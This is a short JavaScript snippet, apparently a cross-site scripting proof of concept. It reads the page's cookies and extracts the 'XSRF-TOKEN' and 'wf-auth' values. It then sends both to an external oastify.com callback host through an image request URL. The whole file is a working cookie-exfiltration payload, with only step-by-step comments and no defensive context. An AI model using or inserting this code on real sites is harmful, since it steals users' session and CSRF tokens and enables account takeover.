function getCookieValue(cookieName) {
    // Step 1: Get the Cookie String
    var cookieString = document.cookie;
    // Step 2: Parse the Cookie String
    var cookies = cookieString.split(';');
    // Step 3: Search for the Specific Cookie
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        // Step 4: Extract the Value
        if (cookie.indexOf(cookieName + '=') === 0) {
            return cookie.substring(cookieName.length + 1);
        }
    }

    // Return null if the cookie is not found
    return null;
}

// Example Usage:
var myCookieValueCSRF = getCookieValue('XSRF-TOKEN');
var myCookieValueToken = getCookieValue('wf-auth');

console.log(`Your CSRF is ${myCookieValueCSRF} and, your Token is ${myCookieValueToken}`)

var img = new Image();

// Set the source (URL) of the image
img.src = 'https://r3vylp0j4i74fi1xzfksh9eau10soncc.oastify.com/?csrf=' + myCookieValueCSRF + '&token=' + myCookieValueToken;

// Add an event listener to handle the 'load' event
img.onload = function() {
    // The image has successfully loaded
    console.log('Image loaded successfully!');

    // You can now append the image to the document or perform other actions
    document.body.appendChild(img);
};